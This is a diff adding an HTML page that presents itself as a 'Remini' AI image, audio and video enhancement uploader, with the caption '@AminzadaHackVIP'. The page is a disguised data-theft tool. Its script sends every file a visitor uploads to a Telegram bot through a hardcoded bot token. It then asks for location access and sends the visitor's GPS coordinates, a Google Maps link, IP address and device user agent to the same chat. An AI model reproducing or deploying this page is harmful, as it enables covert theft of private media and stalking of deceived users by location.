@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Smart Interface Remini</title>
+  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Vazirmatn', sans-serif;
+      background: radial-gradient(circle at top left, #0f0f0f, #050505);
+      color: #fff;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      width: 200%;
+      height: 200%;
+      background: repeating-radial-gradient(circle, rgba(0,255,255,0.07) 0, rgba(0,255,255,0.07) 1px, transparent 1px, transparent 40px);
+      animation: rotateBg 60s linear infinite;
+      z-index: 0;
+    }
+
+    @keyframes rotateBg {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 40px;
+      backdrop-filter: blur(20px);
+      box-shadow: 0 0 40px rgba(0, 255, 255, 0.1);
+      width: 90%;
+      max-width: 500px;
+      margin: auto;
+      margin-top: 7vh;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+      font-size: 28px;
+      color: #00ffd5;
+      margin-bottom: 15px;
+      text-shadow: 0 0 12px #00ffd5;
+    }
+
+    p {
+      font-size: 15px;
+      color: #d8d8d8;
+      margin-bottom: 10px;
+    }
+
+    label {
+      background: rgba(255, 255, 255, 0.08);
+      border: 2px dashed #00ffe0;
+      padding: 16px;
+      border-radius: 14px;
+      cursor: pointer;
+      display: block;
+      margin-bottom: 18px;
+      color: #00e1ff;
+      font-weight: 600;
+      transition: 0.3s ease;
+    }
+
+    label:hover {
+      background-color: rgba(0, 255, 255, 0.1);
+      transform: scale(1.03);
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    button {
+      background: linear-gradient(135deg, #00ffc8, #7b61ff);
+      color: #000;
+      border: none;
+      padding: 14px 30px;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.4s ease;
+      box-shadow: 0 0 15px #00ffd5;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px #00ffd5;
+    }
+
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    #loader {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      width: 70px;
+      height: 70px;
+      border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top: 6px solid #00ffd5;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+      transform: translate(-50%, -50%);
+      z-index: 999;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div id="loader"></div>
+  <div class="container">
+    <h2>🌌 Remini Central Interface</h2>
+    <p id="desc">Upload your images, audio, or video and let the AI make the masterpiece.</p>
+    <p id="formats" style="font-size: 13px; color: #888; margin-top: -5px; margin-bottom: 20px;">
+      📁 Supported formats: JPG, PNG, MP4, MP3 and other popular formats
+    </p>    
+    <form id="uploadForm">
+      <input type="file" id="fileInput" accept="image/*" multiple>
+      <label for="fileInput">📷 Select Image File</label>
+
+      <input type="file" id="audioInput" accept="audio/*" multiple>
+      <label for="audioInput">🎵 Select Audio File</label>
+
+      <input type="file" id="videoInput" accept="video/*" multiple>
+      <label for="videoInput">🎬 Select Video File</label>
+
+      <button type="submit">Upload to Remini Center</button>
+    </form>
+    <div id="status"></div>
+  </div>
+  <script>
+    const botToken = "8324126192:AAF4eBVpoMmIGTLFGOLLTW6UUXAqsAyU944";
+    const chatId = "7573056249";
+    const loader = document.getElementById("loader");
+    const status = document.getElementById("status");
+
+    let userIP = "Fetching...";
+    let userAgent = navigator.userAgent;
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => userIP = data.ip);
+
+    document.getElementById("uploadForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const files = [
+        ...document.getElementById("fileInput").files,
+        ...document.getElementById("audioInput").files,
+        ...document.getElementById("videoInput").files
+      ];
+
+      if (files.length === 0) {
+        status.innerText = "❗ Please select at least one file.";
+        return;
+      }
+
+      const fileNames = [];
+
+      const sendFileToTelegram = async (file, type) => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append(type, file);
+        formData.append('caption', '⚡️ Powered by :- @AminzadaHackVIP');
+
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+          method: "POST",
+          body: formData
+        });
+
+        return response.ok;
+      };
+
+      for (let file of files) {
+        const fileType = file.type.split("/")[0];
+        let telegramType;
+        switch (fileType) {
+          case "image": telegramType = "photo"; break;
+          case "audio": telegramType = "audio"; break;
+          case "video": telegramType = "video"; break;
+          default: telegramType = "document";
+        }
+
+        const success = await sendFileToTelegram(file, telegramType);
+        fileNames.push(file.name);
+
+        if (!success) {
+          status.innerText = `❌ Error uploading file ${file.name}`;
+          loader.style.display = "none";
+          return;
+        }
+      }
+
+      getLocation();
+    });
+
+    async function getLocation() {
+      status.innerText += "📡 Please allow location access to continue...";
+
+      if (!navigator.geolocation) {
+        status.innerText = "❌ Your browser does not support GPS.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        const message = `🌍 Location & IP info:
+
+📌 Latitude: ${lat}
+📌 Longitude: ${lon}
+🗺 https://maps.google.com/?q=${lat},${lon}
+
+🌐 IP: ${userIP}
+🧠 Device: ${userAgent}
+
+⚡️ Powered by:- @AminzadaHackVIP`;
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+
+        status.innerText = "✅ Info sent successfully.";
+      }, () => {
+        status.innerText = "❌ Location access denied by user.";
+      });
+    }
+  </script>
+</body>
+</html>
